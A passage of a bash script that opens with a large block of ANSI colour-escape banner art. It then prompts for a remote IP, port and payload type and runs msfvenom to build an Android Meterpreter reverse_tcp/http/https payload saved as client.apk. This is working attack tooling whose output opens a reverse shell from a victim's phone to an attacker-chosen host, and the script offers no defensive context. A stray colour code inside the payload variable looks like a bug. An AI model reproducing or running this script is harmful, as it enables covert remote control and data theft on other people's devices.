;235;233;238m▍[38;2;235;232;237;48;2;233;232;236m▌[38;2;234;231;238;48;2;232;230;239m▋[38;2;227;228;236;48;2;231;230;238m▄[38;2;223;228;236;48;2;228;230;239m▄[38;2;218;227;234;48;2;214;224;232m▍[38;2;218;223;223;48;2;248;241;232m▌[0m
[7m[38;2;255;240;245m [0m[38;2;253;238;241;48;2;254;239;244m▗[38;2;254;239;243;48;2;252;241;243m▋[38;2;247;240;241;48;2;241;239;239m▋[38;2;237;236;237;48;2;234;232;234m▌[38;2;233;232;234;48;2;232;232;237m▌[38;2;228;230;242;48;2;230;230;239m▗[38;2;230;231;241;48;2;231;230;240m╴[38;2;230;230;240;48;2;232;230;242m▗[38;2;231;231;238;48;2;232;232;237m▖[38;2;233;232;237;48;2;234;233;238m▏[38;2;235;234;237;48;2;236;234;237m▌[38;2;239;233;238;48;2;242;234;238m▊[38;2;243;234;238;48;2;244;233;238m▄[38;2;244;235;238;48;2;246;237;240m▍[38;2;248;239;242;48;2;247;238;241m╹[38;2;247;237;241;48;2;246;238;241m╶[48;2;246;237;240m┷[38;2;246;237;240;48;2;247;238;241m▂[48;2;248;238;241m▁▁[38;2;249;239;240;48;2;247;238;238m▘[38;2;243;238;237;48;2;248;238;239m▝[38;2;244;238;238;48;2;235;236;238m▅[38;2;240;236;237;48;2;212;224;235m▆[38;2;238;235;238;48;2;194;215;228m▅[38;2;229;231;235;48;2;174;208;226m▅[38;2;216;228;236;48;2;161;202;229m▄[38;2;193;217;242;48;2;145;192;238m▃[38;2;153;194;235;48;2;124;183;240m▃[38;2;130;187;237;48;2;116;181;238m▂[38;2;124;186;240;48;2;117;181;242m▃[38;2;121;184;239;48;2;115;180;241m▄[38;2;124;184;236;48;2;117;180;239m▂[38;2;145;191;236;48;2;125;183;235m▂[38;2;178;203;239;48;2;143;193;232m▄[38;2;206;219;239;48;2;166;206;235m▄[38;2;218;224;236;48;2;185;209;230m▅[38;2;227;227;239;48;2;208;220;234m▅[38;2;236;231;234;48;2;232;231;236m▝[38;2;241;237;238;48;2;238;235;238m▝[38;2;240;235;241;48;2;242;238;239m▄[38;2;238;236;240;48;2;242;238;240m▃[38;2;235;236;238;48;2;241;237;239m▄[38;2;238;235;238;48;2;233;233;237m▘[38;2;227;229;238;48;2;232;232;237m▃[38;2;224;228;237;48;2;231;231;236m▄[38;2;224;229;238;48;2;231;230;238m▄[38;2;227;227;238;48;2;221;227;238m▘[38;2;217;228;238;48;2;220;228;236m▄[38;2;212;224;236;48;2;214;224;232m▄[38;2;221;223;227;48;2;250;241;236m▌[0m
[38;2;252;240;244;48;2;255;240;245m▇[38;2;252;237;240;48;2;251;239;242m▝[38;2;250;238;240;48;2;253;239;241m▆[38;2;247;238;239;48;2;244;239;238m▋[38;2;242;239;239;48;2;239;237;237m▃[38;2;235;234;237;48;2;231;231;236m▊[38;2;228;228;238;48;2;226;227;240m▍[38;2;227;229;239;48;2;229;231;240m▋[38;2;229;231;242;48;2;230;230;241m╸[38;2;231;231;239;48;2;233;232;238m▎[38;2;234;233;240;48;2;234;233;239m╻[38;2;234;233;238;48;2;235;234;237m▇[48;2;236;234;239m▄[38;2;235;233;238;48;2;239;234;239m▃[38;2;236;234;238;48;2;243;235;239m▄[38;2;239;233;235;48;2;244;235;238m▃[38;2;240;233;235;48;2;243;236;238m▅[38;2;240;236;238;48;2;242;238;239m▆[38;2;243;237;240;48;2;246;237;240m▌[38;2;245;236;240;48;2;247;237;240m▃[38;2;245;237;240;48;2;246;237;240m▃[38;2;246;237;238;48;2;246;238;237m▌[38;2;247;238;239;48;2;246;237;238m╴[48;2;247;238;238m [48;2;247;237;241m▍[38;2;248;237;243;48;2;247;236;241m━[38;2;247;237;242;48;2;245;236;241m▖[38;2;234;231;237;48;2;243;234;239m▝[38;2;239;232;239;48;2;222;230;237m▄[38;2;230;233;241;48;2;185;213;237m▅[38;2;223;227;241;48;2;160;204;235m▃[38;2;200;217;238;48;2;140;193;234m▃[38;2;193;214;235;48;2;135;191;231m▃[38;2;195;216;231;48;2;142;194;228m▃[38;2;202;216;230;48;2;167;200;234m▄[38;2;195;210;235;48;2;217;223;237m▘[38;2;227;231;236;48;2;219;224;238m▄[38;2;230;232;237;48;2;228;229;239m▅[48;2;234;232;239m [38;2;235;233;239;48;2;233;233;236m▇[38;2;233;233;238;48;2;237;234;240m▃[38;2;233;230;237;48;2;238;233;240m▄[38;2;229;231;236;48;2;235;233;238m▃[38;2;227;233;237;48;2;231;235;237m▃[38;2;223;230;240;48;2;229;232;238m▄[38;2;217;226;237;48;2;222;228;238m▄[38;2;211;224;236;48;2;219;227;237m▃[38;2;209;222;234;48;2;218;227;236m▄[38;2;207;221;233;48;2;214;225;236m▄[38;2;207;223;236;48;2;213;226;238m▅[38;2;205;223;234;48;2;210;224;236m▅[38;2;220;223;227;48;2;248;241;236m▌[0m
[38;2;253;241;243;48;2;252;240;242m╴[38;2;253;238;243;48;2;251;239;242m╻[38;2;248;239;241;48;2;249;238;242m▝[38;2;248;239;242;48;2;248;239;240m▄[38;2;247;238;240;48;2;243;236;239m▋[38;2;239;235;237;48;2;233;233;238m▌[38;2;229;229;241;48;2;224;226;239m▍[38;2;224;226;238;48;2;225;227;239m┓[38;2;225;227;239;48;2;227;230;239m▌[38;2;228;231;239;48;2;232;231;239m▋[38;2;234;233;241;48;2;233;232;240m╵[38;2;232;232;240;48;2;231;232;238m▆[38;2;232;234;238;48;2;232;232;239m┗[38;2;232;235;238;48;2;232;233;237m╸[38;2;234;234;238;48;2;233;233;237m▝[38;2;233;232;237;48;2;235;234;235m▃[38;2;231;230;236;48;2;235;234;236m▁[38;2;233;232;238;48;2;237;234;238m▅[38;2;233;233;238;48;2;239;235;239m▅[38;2;231;231;238m▄[38;2;230;230;236;48;2;241;236;240m▅[38;2;231;231;236;48;2;240;237;237m▄[38;2;236;235;236;48;2;243;237;237m▄[38;2;237;237;239;48;2;245;238;239m▃[38;2;226;238;247;48;2;244;237;240m▁[38;2;227;237;247;48;2;245;237;240m▂[38;2;223;229;241;48;2;246;237;241m▃[38;2;205;217;234;48;2;244;236;241m▂[38;2;214;224;237;48;2;245;236;240m▂[38;2;241;240;241;48;2;248;238;239m▄[38;2;236;244;250;48;2;246;239;240m▁[38;2;243;239;240;48;2;235;235;244m▆[38;2;240;237;240;48;2;227;230;242m▇[38;2;222;236;251;48;2;235;234;240m▂[38;2;178;210;239;48;2;228;234;239m▂[38;2;155;200;236;48;2;223;233;241m▂[38;2;159;202;243;48;2;223;232;240m▂[38;2;184;220;244;48;2;226;234;238m▃[38;2;195;229;245;48;2;228;233;239m▃[38;2;193;230;247;48;2;225;232;241m▂[38;2;194;222;239;48;2;225;228;238m▄[38;2;177;210;236;48;2;219;226;237m▃[38;2;180;213;237;48;2;217;226;238m▃[38;2;193;221;239;48;2;218;228;239m▃[38;2;200;223;238;48;2;215;227;241m▃[38;2;201;221;239;48;2;209;224;238m▅[38;2;197;218;236;48;2;204;222;237m▅[38;2;195;217;235;48;2;201;220;235m▅[38;2;196;218;237;48;2;200;219;234m▅[38;2;196;221;236;48;2;201;221;235m▂[38;2;200;222;236;48;2;205;219;232m▋[38;2;219;220;225;48;2;246;241;233m▌[0m
[38;2;253;241;243;48;2;253;241;243m [38;2;252;240;243;48;2;251;239;242m▆[38;2;250;239;243;48;2;248;238;242m▊[38;2;249;238;242m╴[38;2;248;237;242;48;2;243;235;240m▌[38;2;240;235;239;48;2;234;233;238m▍[38;2;230;229;241;48;2;225;227;238m▘[38;2;221;228;238;48;2;225;227;239m▃[38;2;223;227;239;48;2;226;228;239m▄[38;2;223;228;238;48;2;228;229;238m▃[38;2;224;228;239;48;2;230;230;239m▄[38;2;227;228;240;48;2;231;231;241m▄[38;2;228;228;238m▅[38;2;227;228;237m▄[38;2;227;227;237;48;2;230;230;239m▄[38;2;226;228;237;48;2;230;230;236m▃[38;2;223;227;236;48;2;230;229;235m▄[38;2;220;227;238;48;2;229;228;238m▄[38;2;194;222;243;48;2;220;228;238m▗[38;2;156;202;240;48;2;205;226;243m▄[38;2;122;170;233;48;2;193;218;237m▄[38;2;99;150;227;48;2;186;216;243m▃[38;2;101;154;235;48;2;192;222;245m▃[38;2;109;162;237;48;2;198;226;245m▄[38;2;112;165;237;48;2;192;224;249m▅[38;2;118;173;239;48;2;187;220;248m▆[38;2;123;181;243;48;2;167;204;239m▅[38;2;121;177;245;48;2;160;202;243m▃[38;2;119;176;242;48;2;162;203;239m▃[38;2;125;179;241;48;2;186;218;243m▅[38;2;123;178;239;48;2;195;222;244m▅[38;2;133;187;248;48;2;209;236;247m▅[38;2;117;172;239;48;2;197;226;248m▅[38;2;108;165;233;48;2;175;211;245m▆[38;2;105;156;239;48;2;126;184;239m▃[38;2;92;147;232;48;2;121;186;247m▂[38;2;90;145;236;48;2;116;174;242m▃[38;2;90;139;240;48;2;116;169;237m▅[38;2;86;131;233;48;2;134;186;238m▆[38;2;82;125;230;48;2;142;193;245m▅[38;2;84;127;225;48;2;142;192;247m▅[38;2;87;133;226;48;2;131;181;245m▅[38;2;108;158;235;48;2;142;194;239m▆[38;2;134;188;233;48;2;162;204;238m▅[38;2;164;206;240;48;2;183;216;240m▖[38;2;187;216;237;48;2;194;220;242m▂[38;2;185;216;236;48;2;192;219;239m▂[48;2;191;218;238m▃[38;2;184;217;236m▃[38;2;187;215;233;48;2;191;220;236m▂[38;2;197;218;234;48;2;215;222;235m▋[38;2;232;228;235;48;2;246;235;230m▍[0m
[38;2;254;242;246;48;2;253;241;245m▖[38;2;252;240;244;48;2;251;239;243m▍[38;2;250;238;242;48;2;249;238;244m▊[38;2;248;237;243m▅[38;2;247;236;242;48;2;242;236;240m▊[38;2;233;233;238;48;2;238;235;239m▝[38;2;232;232;237;48;2;227;229;237m▅[38;2;230;233;236;48;2;224;228;236m▖[38;2;222;227;233;48;2;219;226;235m▖[38;2;215;228;236;48;2;217;227;236m▄[38;2;215;227;237;48;2;219;227;237m▄[38;2;217;224;237;48;2;222;226;237m▄[38;2;215;224;237;48;2;223;225;237m▂[38;2;219;224;238;48;2;224;226;238m▄[38;2;219;225;238m▃[38;2;220;228;237;48;2;222;227;236m▅[38;2;217;228;237;48;2;220;227;237m▄[38;2;214;227;236;48;2;217;227;237m▃[38;2;185;213;233;48;2;207;223;236m▝[38;2;207;224;238;48;2;152;195;230m▅[38;2;212;226;242;48;2;133;176;229m▅[38;2;209;225;239;48;2;109;158;222m▆[38;2;213;224;234;48;2;113;156;225m▅[38;2;205;218;234;48;2;100;146;223m▅[38;2;214;224;237;48;2;116;159;225m▄[38;2;207;223;238;48;2;110;161;224m▅[38;2;210;226;239;48;2;112;163;227m▅[38;2;214;228;240;48;2;115;164;227m▅[38;2;215;229;238;48;2;114;162;226m▅[38;2;215;230;238;48;2;109;157;225m▅[38;2;220;230;241;48;2;113;155;223m▄[38;2;210;219;239;48;2;103;144;222m▄[38;2;219;228;240;48;2;107;149;219m▄[38;2;219;230;240;48;2;114;160;224m▅[38;2;222;231;240;48;2;124;167;224m▅[38;2;218;229;240;48;2;125;166;227m▅[38;2;205;221;239;48;2;112;155;229m▆[38;2;210;224;236;48;2;133;173;237m▅[38;2;212;223;236;48;2;131;172;234m▅[38;2;213;222;235;48;2;133;173;232m▅[38;2;213;220;234;48;2;149;190;239m▅[48;2;156;195;239m▅[38;2;210;220;233;48;2;158;200;234m▅[38;2;200;216;236;48;2;165;208;234m▅[38;2;192;217;237;48;2;176;210;233m▄[38;2;180;216;237;48;2;184;216;236m▗[38;2;171;212;238;48;2;179;214;237m▃[38;2;168;207;237;48;2;176;210;236m▅[38;2;170;211;235;48;2;180;212;235m▊[38;2;209;219;233;48;2;185;210;232m▗[38;2;208;223;238;48;2;232;234;242m▘[38;2;231;228;229;48;2;247;234;227m▍[0m
[38;2;254;241;245;48;2;253;241;245m▋[38;2;252;240;244;48;2;249;239;243m▍[38;2;248;238;242;48;2;249;238;242m▆[38;2;248;237;241;48;2;249;238;244m▆[38;2;248;238;242;48;2;246;238;241m▎[38;2;244;238;237;48;2;243;237;240m▁[38;2;239;235;239;48;2;234;232;237m▍[38;2;229;230;236;48;2;222;227;234m▍[38;2;219;227;234;48;2;214;226;233m▋[38;2;206;222;232;48;2;212;226;233m▆[38;2;204;222;235;48;2;211;225;234m▅[38;2;200;222;236;48;2;209;225;237m▃[38;2;201;221;235m▃[48;2;209;224;236m▄[38;2;201;223;236;48;2;212;224;237m▄[38;2;204;224;237;48;2;215;226;237m▄[38;2;208;224;236;48;2;215;227;238m▅[38;2;211;222;235;48;2;214;225;236m▖[38;2;215;227;237;48;2;219;228;235m▘[38;2;223;231;237;48;2;228;233;237m▌[38;2;236;234;237;48;2;230;233;235m▆[38;2;239;235;240;48;2;238;234;239m╎[38;2;239;234;239;48;2;234;234;238m▆[38;2;236;232;238;48;2;234;231;236m▅[38;2;233;233;237;48;2;233;229;241m▇[38;2;226;231;235;48;2;232;230;239m▆[38;2;211;225;235;48;2;229;230;239m▃[38;2;200;223;241;48;2;230;229;242m▃[38;2;188;220;247;48;2;227;230;240m▂[38;2;197;226;247;48;2;232;232;239m▃[38;2;194;223;249;48;2;232;233;240m▃[38;2;177;215;247;48;2;228;233;242m▂[38;2;176;213;249;48;2;228;234;245m▂[38;2;167;207;247;48;2;224;233;243m▂[38;2;152;197;240;48;2;214;231;241m▂[38;2;146;197;236;48;2;211;229;242m▃[38;2;154;198;236;48;2;213;228;244m▄[38;2;180;210;235;48;2;214;226;238m▅[38;2;208;223;234;48;2;218;223;236m▅[38;2;218;226;236;48;2;223;227;238m▖[38;2;221;229;237;48;2;224;228;237m▃[38;2;226;230;238;48;2;225;230;239m▋[38;2;222;229;240;48;2;217;227;240m▌[38;2;210;225;238;48;2;204;222;237m▌[38;2;197;220;237;48;2;190;218;237m▌[38;2;180;215;236;48;2;170;211;235m▌[38;2;157;203;235;48;2;165;209;237m▅[38;2;157;200;228;48;2;163;205;238m▄[38;2;209;218;235;48;2;175;204;230m▗[38;2;214;218;232;48;2;243;238;242m▘[38;2;242;237;242;48;2;231;226;234m▍[38;2;248;239;239;48;2;251;236;228m▌[0m
[38;2;254;241;245;48;2;253;241;245m▌[38;2;249;240;243;48;2;251;240;244m▝[38;2;250;239;243;48;2;248;238;242m▂[48;2;248;238;241m▂[38;2;245;239;243;48;2;245;241;238m▅[38;2;191;211;230;48;2;229;235;240m▗[38;2;204;218;234;48;2;223;230;236m▖[38;2;222;231;236;48;2;219;228;235m▌[38;2;216;226;236;48;2;211;225;236m▋[38;2;200;222;238;48;2;204;223;235m▂[38;2;193;219;237;48;2;199;221;236m▂[38;2;191;216;237;48;2;195;218;234m▃[38;2;190;215;236;48;2;197;217;235m▆[38;2;190;216;236;48;2;198;217;232m▇[38;2;191;216;238;48;2;195;219;234m▆[38;2;192;218;239;48;2;197;220;236m▅[38;2;198;220;238;48;2;204;222;238m▋[38;2;214;225;234;48;2;208;223;236m▝[38;2;216;227;236;48;2;221;230;235m▃[38;2;224;233;237;48;2;229;233;238m▌[38;2;233;232;238;48;2;235;234;239m▃[38;2;236;232;239;48;2;239;233;240m▃[38;2;238;231;238;48;2;240;233;240m▂[38;2;239;233;239;48;2;237;232;238m▘[38;2;235;232;239;48;2;232;231;238m▋[38;2;219;227;236;48;2;228;229;238m▝[38;2;188;214;234;48;2;210;223;236m▝[38;2;192;217;241;48;2;167;204;234m▂[38;2;164;202;236;48;2;143;191;237m▂[38;2;125;178;236;48;2;159;208;247m▇[38;2;119;175;236;48;2;152;202;243m▇[38;2;119;176;238;48;2;144;196;240m▇[38;2;121;179;242;48;2;142;193;246m▇[38;2;139;192;241;48;2;118;176;239m▂[38;2;147;195;233;48;2;119;177;230m▂[38;2;176;209;237;48;2;135;190;232m▃[38;2;197;218;237;48;2;151;198;232m▄[38;2;208;225;237;48;2;180;214;234m▄[38;2;203;224;234;48;2;213;226;236m▘[38;2;218;227;237;48;2;222;228;239m▍[38;2;223;227;238;48;2;221;228;236m▃[38;2;218;226;237;48;2;223;230;239m▅[38;2;212;223;237;48;2;218;228;240m▅[38;2;212;224;238;48;2;204;220;237m▘[38;2;182;210;237;48;2;193;216;236m▗[38;2;173;208;235;48;2;163;205;237m▌[38;2;157;204;238;48;2;155;203;232m▍[38;2;226;222;240;48;2;174;205;228m▗[38;2;211;221;235;48;2;246;237;245m▘[38;2;248;241;249;48;2;248;241;244m▗[38;2;225;219;230;48;2;237;229;239m┃[38;2;250;241;241;48;2;249;238;229m▌[0m
[7m[38;2;254;242;246m [0m[38;2;254;242;246;48;2;252;240;244m┃[38;2;252;240;244;48;2;251;238;243m╸[38;2;252;238;243;48;2;250;238;242m▖[38;2;247;238;243;48;2;235;237;246m▊[38;2;210;227;245;48;2;165;198;226m▍[38;2;160;199;228;48;2;195;221;235m▖[38;2;224;231;236;48;2;220;231;238m╲[38;2;216;229;239;48;2;205;224;238m▋[38;2;195;219;236;48;2;185;216;235m▌[38;2;184;216;239;48;2;187;218;241m▄[38;2;184;214;241;48;2;187;216;239m▄[38;2;179;212;240;48;2;185;214;238m▄[38;2;175;214;240;48;2;185;214;239m▄[38;2;176;214;240;48;2;187;214;240m▅[38;2;176;214;238;48;2;186;215;238m▄[38;2;180;215;236;48;2;191;218;237m▃[38;2;190;217;235;48;2;199;219;236m▃[38;2;201;219;235;48;2;211;223;235m▖[38;2;217;226;236;48;2;222;227;237m▌[38;2;224;227;237;48;2;228;228;236m▖[38;2;230;228;239;48;2;232;230;237m▃[38;2;233;230;239;48;2;237;230;237m▆[38;2;235;231;239;48;2;237;231;238m▆[38;2;236;232;239;48;2;235;231;238m╹[38;2;237;233;240;48;2;234;231;239m▂[38;2;233;232;238;48;2;224;228;237m▆[38;2;230;231;236;48;2;212;226;238m▅[38;2;227;228;233;48;2;199;220;240m▄[38;2;220;224;238;48;2;175;204;237m▅[38;2;222;225;236;48;2;177;205;233m▄[38;2;216;223;235;48;2;169;202;232m▅[38;2;216;224;235;48;2;169;203;231m▅[38;2;219;226;235;48;2;172;205;230m▅[38;2;231;231;237;48;2;191;217;231m▄[38;2;238;229;237;48;2;210;223;234m▄[38;2;238;230;238;48;2;222;225;233m▄[38;2;239;233;238;48;2;224;229;236m▃[38;2;236;232;240;48;2;226;228;238m▃[38;2;230;228;240;48;2;228;229;238m▊[38;2;225;228;238;48;2;220;226;236m▋[38;2;215;225;235;48;2;209;223;236m▌[38;2;194;219;238;48;2;203;221;238m▗[38;2;184;215;239;48;2;196;217;238m▅[38;2;161;208;236;48;2;174;211;240m▗[38;2;162;203;231;48;2;161;202;239m▅[38;2;223;233;236;48;2;180;207;230m▃[38;2;249;238;242;48;2;236;230;244m▅[38;2;252;239;243;48;2;253;238;246m▆[38;2;252;241;245;48;2;247;239;250m▋[38;2;222;219;229;48;2;235;230;240m┃[38;2;251;242;242;48;2;251;238;229m▌[0m
[7m[38;2;254;242;244m [0m[38;2;253;241;243;48;2;252;240;242m╵[38;2;252;240;243;48;2;251;238;241m▆[38;2;250;239;243;48;2;248;238;242m▍[38;2;246;239;242;48;2;245;239;240m▖[38;2;207;229;242;48;2;237;240;241m▝[38;2;216;229;245;48;2;168;195;229m▖[38;2;154;192;226;48;2;194;217;238m▖[38;2;204;223;241;48;2;221;229;241m▖[38;2;195;215;232;48;2;219;225;238m▝[38;2;196;216;232;48;2;177;211;234m▖[38;2;161;207;235;48;2;172;210;238m▄[38;2;158;206;238;48;2;171;208;240m▅[38;2;156;207;238;48;2;165;206;238m▄[38;2;157;205;237;48;2;165;208;239m▅[38;2;159;206;237;48;2;169;209;239m▅[38;2;162;205;234;48;2;171;211;236m▄[38;2;169;207;233;48;2;180;214;235m▃[38;2;187;216;235;48;2;202;222;237m▍[38;2;221;228;240;48;2;212;226;239m▝[38;2;223;228;239;48;2;224;228;235m▌[38;2;225;228;235;48;2;228;229;238m▍[38;2;230;228;241;48;2;232;230;239m▍[38;2;233;233;239;48;2;233;232;238m▗[38;2;235;233;239;48;2;234;231;237m▇[38;2;236;234;240;48;2;237;232;238m▆[38;2;237;235;240;48;2;241;235;242m▍[38;2;245;237;242;48;2;240;236;241m▅[38;2;245;238;241;48;2;239;235;240m▅[38;2;246;238;240;48;2;241;233;236m▆[38;2;247;237;240;48;2;241;235;233m▆[38;2;249;237;241;48;2;242;235;233m▆[38;2;248;236;239;48;2;239;234;232m▇[38;2;247;236;239;48;2;242;236;236m▆[38;2;246;237;238;48;2;245;234;236m▆[38;2;244;237;238;48;2;249;233;237m▅[38;2;242;236;237;48;2;246;235;237m▗[38;2;233;234;237;48;2;242;234;237m▃[38;2;225;230;237;48;2;235;232;237m▃[38;2;217;226;236;48;2;224;230;237m▃[38;2;207;223;238;48;2;215;227;235m▃[38;2;185;217;241;48;2;201;222;238m▗[38;2;173;210;241;48;2;186;215;238m▄[38;2;164;205;236;48;2;176;210;238m▆[38;2;218;227;238;48;2;176;205;231m▂[38;2;188;208;229;48;2;240;236;243m▘[38;2;252;241;242;48;2;244;242;243m▆[38;2;254;243;244;48;2;253;242;242m▃[38;2;253;242;247;48;2;252;241;245m▃[38;2;248;241;248;48;2;235;235;242m▊[38;2;224;221;229;48;2;243;234;238m▋[38;2;250;238;237;48;2;251;235;230m▌[0m
[38;2;254;242;245;48;2;253;241;244m╴[38;2;253;241;241;48;2;253;241;243m▅[38;2;252;240;240;48;2;252;240;242m┏[38;2;251;239;241;48;2;250;239;243m▆[38;2;249;239;242;48;2;247;238;241m▌[38;2;248;239;241;48;2;245;238;241m▅[38;2;217;232;246;48;2;243;238;240m▝[38;2;217;227;237;48;2;164;202;229m▄[38;2;197;219;237;48;2;157;195;223m▝[38;2;190;217;234;48;2;222;230;240m▖[38;2;207;227;239;48;2;223;233;240m▝[38;2;205;222;242;48;2;172;210;237m▄[38;2;165;203;233;48;2;146;194;235m▖[38;2;135;189;236;48;2;149;202;241m▅[38;2;134;192;242;48;2;149;201;241m▃[38;2;140;196;243;48;2;151;200;239m▃[38;2;142;199;241;48;2;151;201;237m▃[38;2;145;199;236;48;2;156;202;234m▄[38;2;152;203;232;48;2;175;213;236m▅[38;2;166;211;236;48;2;190;221;237m▃[38;2;192;220;237;48;2;214;226;238m▃[38;2;210;226;233;48;2;219;229;237m▂[38;2;218;229;233;48;2;224;229;237m▅[38;2;222;229;237;48;2;228;230;235m▅[38;2;230;228;235;48;2;234;231;238m▄[38;2;231;228;235;48;2;235;231;238m▂[38;2;236;231;237;48;2;241;232;239m▄[38;2;238;234;237;48;2;244;236;240m▄[38;2;239;235;236;48;2;245;237;240m▄▄[38;2;237;234;235;48;2;246;236;240m▃[38;2;234;233;233;48;2;245;236;239m▂[38;2;235;234;234;48;2;244;234;238m▃[38;2;235;233;236m▃[38;2;233;234;238;48;2;243;235;240m▃[38;2;231;233;242;48;2;243;237;240m▃[38;2;225;230;241;48;2;239;233;238m▃[38;2;213;228;241;48;2;227;232;238m▃[38;2;204;222;239;48;2;217;226;236m▃[38;2;197;221;241;48;2;210;224;237m▃[38;2;186;217;240;48;2;198;223;239m▃[38;2;186;219;242;48;2;169;209;239m▘[38;2;159;203;235;48;2;162;206;238m▆[38;2;172;202;226;48;2;208;219;232m▋[38;2;233;236;242;48;2;249;240;241m▘[38;2;252;241;243;48;2;251;241;240m▅[38;2;254;241;243;48;2;253;241;242m▝[38;2;253;241;243;48;2;254;241;243m▃[38;2;253;241;246;48;2;251;240;246m▌[38;2;242;236;244;48;2;221;221;232m▋[38;2;225;223;233;48;2;248;235;241m▍[38;2;250;236;234;48;2;247;235;227m▌[0m
[38;2;208;198;200;48;2;252;242;244m▂[38;2;209;198;197;48;2;252;243;242m▂[38;2;209;197;197;48;2;252;242;242m▂[38;2;250;240;241;48;2;237;226;228m╾[38;2;167;155;157;48;2;250;239;241m▁[38;2;166;155;156;48;2;250;239;239m▁[38;2;250;238;238;48;2;237;226;226m╴[38;2;203;193;198;48;2;245;236;240m▂[38;2;159;153;163;48;2;210;227;242m▁[38;2;153;188;212;48;2;179;203;226m▚[38;2;138;134;152;48;2;212;223;237m▁[38;2;227;229;237;48;2;215;216;228m╴[38;2;175;210;235;48;2;198;213;225m▝[38;2;155;191;215;48;2;137;190;234m▄[38;2;122;165;217;48;2;123;183;235m▅[38;2;108;145;202;48;2;125;181;240m▃[38;2;110;149;201;48;2;133;190;246m▃[38;2;122;168;220;48;2;137;195;242m▅[38;2;127;172;219;48;2;140;196;239m▅[38;2;131;167;212;48;2;147;198;239m▄[38;2;110;122;152;48;2;167;205;237m▁[38;2;158;182;198;48;2;193;221;237m▃[38;2;152;167;182;48;2;197;224;235m▂[38;2;175;190;206;48;2;207;226;240m▃[38;2;181;190;208;48;2;215;224;238m▃[38;2;190;198;217;48;2;219;225;238m▄[38;2;170;177;193;48;2;221;228;243m▂[38;2;172;178;193;48;2;222;231;241m▂[38;2;193;204;215;48;2;225;233;239m▄▄[38;2;193;203;214m▄[48;2;224;232;238m▄[38;2;186;194;205;48;2;222;231;239m▃[38;2;189;204;216;48;2;222;231;240m▄[38;2;169;188;206;48;2;214;228;241m▃[38;2;148;167;192;48;2;201;221;243m▂[38;2;153;177;204;48;2;197;221;242m▃[38;2;154;174;203;48;2;189;217;242m▃[38;2;134;155;186;48;2;177;211;240m▂[38;2;140;170;203;48;2;173;210;242m▃[38;2;130;153;185;48;2;165;206;240m▂[38;2;109;122;150;48;2;159;199;232m▁[38;2;168;202;232;48;2;156;187;216m▝[38;2;189;206;221;48;2;223;224;230m▌[38;2;162;151;157;48;2;250;238;243m▁[38;2;252;241;246;48;2;240;226;232m╸[38;2;253;240;245;48;2;237;222;229m┷[38;2;253;240;247;48;2;240;226;232m─[38;2;253;241;248;48;2;240;227;233m╴[38;2;244;238;244;48;2;223;216;222m▘[38;2;163;152;160;48;2;242;232;239m▁[38;2;235;223;225;48;2;241;229;225m▎[0m
""" | pv -qL 30000
}
play_func | banner
#node index.js

#Setting color codes
RED='\033[0;31m'
BOLD_RED='\033[1;31m'
GREEN='\033[32m'
YELLOW='\033[33m'
CYAN='\033[36m'
BLUE='\033[34m'
MAGENTA='\033[35m'
END='\033[0m'

# This script creates a msfvenom android payload
echo "$(tput  setaf 4)This script generates a Metasploit payload for usage on an Android device. $(tput sgr0)"

# Prompt user to enter IP address
read -p "$(tput setaf 9) Please enter Remote IP address:- $(tput sgr0)" ipaddress

# Prompt user to enter port number
read -p "$(tput setaf 4)Please enter Remote port number:- $(tput sgr0)" portnumber

# Prompt user for payload type
echo -e "${CYAN} Please select payload type: ${END}"
echo -e "${BLUE} 1. android\/meterpreter\/reverse_tcp ${END}"
echo -e "${GREEN} 2. android\/meterpreter\/reverse_http ${END}"
echo -e "${YELLOW} 3. android\/meterpreter\/reverse_https ${END}"

read -p "$(tput  setaf 6) Please enter Payload type numer (1,2,3): $(tput sgr0)" payloadnum

# Cases for payload type
case $payloadnum in
 1)
  payload="android/meterpreter/reverse_tcp ${END}"
  ;;
 2)
  payload="android/meterpreter/reverse_http ${END}"
  ;;
 3)
  payload="android/meterpreter/reverse_https ${END}"
  ;;
esac

# Create payload
echo -e "${YELLOW} Creating payload, please wait... ${END}"
msfvenom -p $payload LHOST=$ipaddress LPORT=$portnumber R > client.apk
echo -e "${CYAN} Payload created... ${END}"
echo -e "${MAGENTA} Payload is stored in client.apk file. ${END}"

